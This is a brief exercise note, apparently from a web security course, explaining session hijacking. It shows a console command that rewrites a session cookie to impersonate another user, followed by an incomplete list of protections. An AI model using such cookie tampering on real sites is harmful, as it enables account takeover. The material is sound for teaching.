Exercise 1

	Session Hijacking = Use someone else's session identifier (like a cookie or a url parameter value) to fake the own identity with the server

	Login with Max Mustermann --> Look at cookie which stores value "Max" and replace it with "John"

									==> in Chrome: Console -> Enter document.cookie="session=John"


	Protection: * associate a session with a location/ip-address/mac to avoid hijacking
				*
